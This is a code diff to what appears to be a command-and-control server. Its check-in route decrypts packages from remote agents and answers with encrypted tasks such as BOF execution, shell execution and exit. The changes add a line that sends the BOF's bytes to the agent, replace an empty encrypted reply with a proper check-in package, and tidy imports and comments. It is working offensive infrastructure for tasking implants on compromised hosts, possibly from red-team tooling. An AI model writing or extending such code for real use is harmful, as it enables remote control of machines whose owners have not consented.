@@ -18,7 +18,7 @@ from package import (
     PKG_CMD_CHECKIN, PKG_CMD_TASK_OUTPUT, PKG_CMD_TASK_ERROR,
     PKG_CMD_TASK_COMPLETE, PKG_CMD_BOF_OUTPUT,
     PKG_CMD_EXIT, PKG_CMD_BOF_EXECUTE, PKG_CMD_EXEC_SHELL,
-    PKG_CMD_TASK_BATCH, PKG_FLAG_BATCH, PKG_FLAG_ENCRYPTED,
+    PKG_CMD_TASK_BATCH, PKG_FLAG_ENCRYPTED, PKG_FLAG_BATCH,
     _decrypt_payload, _encrypt_payload, agent_id_hash
 )
 
@@ -364,14 +364,14 @@ def route_checkin(aid):
     key = a["key"]
     a["last_seen"] = datetime.now()
 
-    # 1. Decrypt and parse the top‑level package
+    # Decrypt and parse the top‑level package
     try:
         top = PackageReader(request.data, key)
     except Exception as e:
         async_log(f"Bad package from {aid[:8]}: {e}", "err")
         return b"bad request", 400
 
-    # 2. Process sub‑packages (batch or single)
+    # Process sub‑packages (batch or single)
     if top.flags & PKG_FLAG_BATCH:
         readers = parse_batch(top.payload, key)
     else:
@@ -380,7 +380,7 @@ def route_checkin(aid):
     for reader in readers:
         _process_incoming_package(aid, a, reader)
 
-    # 3. Build response: batch of pending tasks
+    # Build response: batch of pending tasks
     pending = a["pending_tasks"]
     sub_packages = []
 
@@ -395,6 +395,7 @@ def route_checkin(aid):
             pkg = PackageBuilder(PKG_CMD_BOF_EXECUTE, request_id=task_id,
                                  encrypt=True, agent_id=aid)
             pkg.add_string(task["name"])
+            pkg.add_bytes(bytes.fromhex(task["bof_data"]))
             pkg.add_string(task["args_hex"])
         elif task["type"] == "kill":
             pkg = PackageBuilder(PKG_CMD_EXIT, request_id=task_id,
@@ -417,8 +418,8 @@ def route_checkin(aid):
         return wire, 200, {"Content-Type": "application/octet-stream"}
     else:
         # Send empty encrypted payload (the agent will decrypt to nothing)
-        plain = b""
-        wire = _encrypt_payload(key, plain)
+        empty_pkg = PackageBuilder(PKG_CMD_CHECKIN, encrypt=True, agent_id=aid)
+        wire = empty_pkg.finalize(key)
         a["bytes_sent"] += len(wire)
         save_state()
         return wire, 200, {"Content-Type": "application/octet-stream"}
